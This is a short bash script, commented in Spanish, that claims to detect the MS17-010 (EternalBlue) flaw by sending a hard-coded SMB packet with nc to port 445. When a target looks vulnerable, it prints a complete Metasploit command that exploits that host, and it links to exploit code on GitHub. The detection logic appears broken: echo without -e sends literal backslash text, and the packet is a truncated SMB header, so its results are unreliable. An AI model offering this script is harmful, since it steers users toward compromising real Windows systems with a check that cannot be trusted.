#!/bin/bash
# Detector SUPER simple de MS17-010 (EternalBlue)

target=$1

echo "[+] Probando MS17-010 (EternalBlue) en $target"
echo "[+] Este es el chequeo MÁS SIMPLE posible"

# El chequeo original de EternalBlue
check_packet=$(echo -n "\\x00\\x00\\x00\\x90\\xff\\x53\\x4d\\x42\\x25\\x00\\x00\\x00\\x00\\x18\\x01\\x28" | xxd -p)

# Envía el paquete
response=$(echo -n "$check_packet" | xxd -r -p | timeout 2 nc -w1 $target 445 2>/dev/null | xxd -p)

if [ -z "$response" ]; then
    echo "[-] No hay respuesta"
    exit 1
fi

# Busca la respuesta característica
if echo "$response" | grep -q "c0000205"; then
    echo "[+] ¡VULNERABLE a MS17-010 (EternalBlue)!"
    echo ""
    echo "Para explotar (si tienes Metasploit):"
    echo "  msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOST $target; exploit\""
    echo ""
    echo "O usa el exploit de GitHub:"
    echo "  https://github.com/helviojunior/MS17-010"
elif echo "$response" | grep -q "c0000022\|c0000008"; then
    echo "[-] Probablemente NO vulnerable (ya parcheado)"
else
    echo "[-] Respuesta inesperada - no se puede determinar"
fi
